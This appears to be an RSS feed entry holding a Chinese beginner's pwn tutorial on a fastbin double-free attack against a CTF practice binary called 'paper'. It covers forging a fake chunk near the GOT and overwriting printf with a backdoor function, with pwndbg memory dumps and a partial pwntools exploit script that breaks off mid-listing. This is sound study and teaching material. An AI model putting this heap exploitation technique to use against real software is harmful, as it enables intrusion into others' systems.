<?xml version="1.0"?>
<rss version="2.0">
    <channel>
        <title>唐仔橙 • Posts by &#34;堆&#34; tag</title>
        <link>https://tangzichengcc.github.io</link>
        <description>喜欢探索世界,在读研究生,计算机爱好者的成长记录</description>
        <language>zh-CN</language>
        <pubDate>Tue, 07 Mar 2023 14:54:38 +0800</pubDate>
        <lastBuildDate>Tue, 07 Mar 2023 14:54:38 +0800</lastBuildDate>
        <category>路由器</category>
        <category>旅游</category>
        <category>浏览器安全</category>
        <category>C语言</category>
        <category>csapp</category>
        <category>PWN入门</category>
        <category>堆</category>
        <category>docker</category>
        <category>脚本</category>
        <category>研究生课程</category>
        <category>诗歌</category>
        <category>调试</category>
        <category>论文</category>
        <category>KVM</category>
        <category>USENIX</category>
        <item>
            <guid isPermalink="true">https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-17-%E5%A0%86%E5%85%A5%E9%97%A8%E4%B9%8Bfasbinattack/</guid>
            <title>pwn入门-17-堆入门之fasbinattack</title>
            <link>https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-17-%E5%A0%86%E5%85%A5%E9%97%A8%E4%B9%8Bfasbinattack/</link>
            <category>PWN入门</category>
            <category>堆</category>
            <pubDate>Tue, 07 Mar 2023 14:54:38 +0800</pubDate>
            <description><![CDATA[ &lt;p&gt;xuanxuan : &lt;a href=&#34;https://xuanxuanblingbling.github.io/ctf/pwn/2020/02/02/paper/&#34;&gt;https://xuanxuanblingbling.github.io/ctf/pwn/2020/02/02/paper/&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&#34;Write-Some-Paper&#34;&gt;&lt;a href=&#34;#Write-Some-Paper&#34; class=&#34;headerlink&#34; title=&#34;Write_Some_Paper&#34;&gt;&lt;/a&gt;Write_Some_Paper&lt;/h1&gt;&lt;p&gt;申请不同的编号有影响吗????&lt;/p&gt;
&lt;h2 id=&#34;怎么getshell呢&#34;&gt;&lt;a href=&#34;#怎么getshell呢&#34; class=&#34;headerlink&#34; title=&#34;怎么getshell呢?&#34;&gt;&lt;/a&gt;怎么getshell呢?&lt;/h2&gt;&lt;p&gt;​		首先是获取任意或者受限制的地址读写的能力,然后修改关键函数等,比如修改got表,把函数地址替换成system或者后门函数地址,然后再执行的时候就getshell了&lt;/p&gt;
&lt;h2 id=&#34;怎么实现地址写&#34;&gt;&lt;a href=&#34;#怎么实现地址写&#34; class=&#34;headerlink&#34; title=&#34;怎么实现地址写?&#34;&gt;&lt;/a&gt;怎么实现地址写?&lt;/h2&gt;&lt;p&gt;​		利用double free,可以操控堆块的fd,从而实现把任意地址当作bin来进行申请空间,这样就获得了该地址的读写能力&lt;/p&gt;
&lt;h2 id=&#34;double-free&#34;&gt;&lt;a href=&#34;#double-free&#34; class=&#34;headerlink&#34; title=&#34;double free&#34;&gt;&lt;/a&gt;double free&lt;/h2&gt;&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;40&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;h&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;40&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;h&amp;quot;&lt;/span&gt;) &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;delete(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;delete(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;delete(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)  &lt;span class=&#34;comment&#34;&gt;//double free了&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;40&lt;/span&gt;,p64(&lt;span class=&#34;number&#34;&gt;0x60203a&lt;/span&gt;))&lt;span class=&#34;comment&#34;&gt;//这个需要填入覆盖地址了&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;40&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;bbb&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;40&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;bbb&amp;quot;&lt;/span&gt;)  &lt;span class=&#34;comment&#34;&gt;// 这一步后,会把fd(p64(0x60203a)) 放到fastbin的头部,下一次会申请到这里&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;40&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;\x40\x00\x00\x00\x00\x00&amp;quot;&lt;/span&gt;+p64(ELF.symbols[&lt;span class=&#34;string&#34;&gt;&amp;#x27;gg&amp;#x27;&lt;/span&gt;])) &lt;span class=&#34;comment&#34;&gt;//此时申请的就是第一次add时填入的fd地址		&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h2 id=&#34;申请堆块时的地址约束&#34;&gt;&lt;a href=&#34;#申请堆块时的地址约束&#34; class=&#34;headerlink&#34; title=&#34;申请堆块时的地址约束&#34;&gt;&lt;/a&gt;申请堆块时的地址约束&lt;/h2&gt;&lt;p&gt;​		即size字段需要是fastbin这个链的大小，即目标地址的前8个字节需要满足，64位下这8个字节只要低4个字节满足就可以了。所以通过这种方式，我们可以控制的内存是需要满足一定约束的内存。也可以称这种满足要求的内存部分为伪堆块。获得这种内存有两种方式：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;寻找是否有天然满足伪堆块的约束的内存&lt;/li&gt;
&lt;li&gt;想办法构造伪堆块&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;8字节prev_size 随意 , &lt;font color=&#34;red&#34;&gt;8字节size(64位下前4字节满足大小,如0x40大小)&lt;/font&gt;,要覆盖的fd(要修改的内存地址)&lt;/p&gt;
&lt;p&gt;要找到覆盖的函数,&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; x/&lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;gx &lt;span class=&#34;number&#34;&gt;0x602000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x602000&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x0000000000601e28&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00007ffff7ffe168&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x602010&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x00007ffff7dee0b0&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00007ffff7a91a70&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x602020&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x00007ffff7a7d5d0&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00007ffff7a7c0e0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x602030&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x0000000000400746&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0000000000400756&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x602040&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x00007ffff7a637b0&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00007ffff7a2e740&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x602050&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x0000000000400786&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00007ffff7a493b0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x602060&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x00007ffff7a91550&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00007ffff7a7ddb0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x602070&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x00007ffff7a79480&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00000000004007d6&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;这几个地方都可以作为size&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-17-%E5%A0%86%E5%85%A5%E9%97%A8%E4%B9%8Bfasbinattack/image-20230307155602238.png&#34; alt=&#34;image-20230307155602238&#34;&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x602000&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x1e&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x60&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x602008&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0x68&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0xe1&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0xff&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0xf7&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0xff&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x7f&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x602010&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0xb0&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0xe0&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0xde&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0xf7&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0xff&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x7f&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x602018&lt;/span&gt; &amp;lt;&lt;span class=&#34;built_in&#34;&gt;free&lt;/span&gt;@got.plt&amp;gt;:	&lt;span class=&#34;number&#34;&gt;0x70&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x1a&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0xa9&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0xf7&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0xff&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x7f&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x602020&lt;/span&gt; &amp;lt;&lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;@got.plt&amp;gt;:	&lt;span class=&#34;number&#34;&gt;0xd0&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0xd5&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0xa7&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0xf7&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0xff&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x7f&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x602028&lt;/span&gt; &amp;lt;fread@got.plt&amp;gt;:	&lt;span class=&#34;number&#34;&gt;0xe0&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0xc0&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0xa7&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0xf7&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0xff&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x7f&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x602030&lt;/span&gt; &amp;lt;__stack_chk_fail@got.plt&amp;gt;:	&lt;span class=&#34;number&#34;&gt;0x46&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x07&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x40&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x602038&lt;/span&gt; &amp;lt;system@got.plt&amp;gt;:	&lt;span class=&#34;number&#34;&gt;0x56&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x07&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x40&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x602040&lt;/span&gt; &amp;lt;&lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;@got.plt&amp;gt;:	&lt;span class=&#34;number&#34;&gt;0xb0&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x37&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0xa6&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0xf7&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0xff&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x7f&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x602048&lt;/span&gt; &amp;lt;__libc_start_main@got.plt&amp;gt;:	&lt;span class=&#34;number&#34;&gt;0x40&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0xe7&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0xa2&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0xf7&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0xff&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x7f&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x602050&lt;/span&gt; &amp;lt;__gmon_start__@got.plt&amp;gt;:	&lt;span class=&#34;number&#34;&gt;0x86&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x07&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x40&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x602058&lt;/span&gt; &amp;lt;strtol@got.plt&amp;gt;:	&lt;span class=&#34;number&#34;&gt;0xb0&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x93&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0xa4&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0xf7&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0xff&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x7f&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x602060&lt;/span&gt; &amp;lt;&lt;span class=&#34;built_in&#34;&gt;malloc&lt;/span&gt;@got.plt&amp;gt;:	&lt;span class=&#34;number&#34;&gt;0x50&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x15&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0xa9&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0xf7&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		&lt;font color=&#34;red&#34;&gt;根据这个来选择申请的堆块的大小&lt;/font&gt;&lt;/p&gt;
&lt;p&gt;​		注意大小端的问题,这里选取这里作为伪造的chunk的size,然后后面是可控的数据,注意不要把system破坏了,然后把printf修改成后们地址即可&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-17-%E5%A0%86%E5%85%A5%E9%97%A8%E4%B9%8Bfasbinattack/image-20230411214141077.png&#34; alt=&#34;image-20230411214141077&#34;&gt;	&lt;/p&gt;
&lt;h1 id=&#34;exp&#34;&gt;&lt;a href=&#34;#exp&#34; class=&#34;headerlink&#34; title=&#34;exp&#34;&gt;&lt;/a&gt;exp&lt;/h1&gt;&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.log_level= &lt;span class=&#34;string&#34;&gt;&amp;quot;debug&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;io = process(&lt;span class=&#34;string&#34;&gt;&amp;quot;./paper&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;elf = ELF(&lt;span class=&#34;string&#34;&gt;&amp;quot;./paper&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;add&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;num,length,context&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;delete paper&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;1&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;(0-9):&amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(num))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;enter&amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(length))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;content&amp;quot;&lt;/span&gt;,context)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;delete&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;index&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;delete paper&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;2&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    io.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;quot;(0-9):&amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(index))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;40&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;h&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;40&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;h&amp;quot;&lt;/span&gt;) 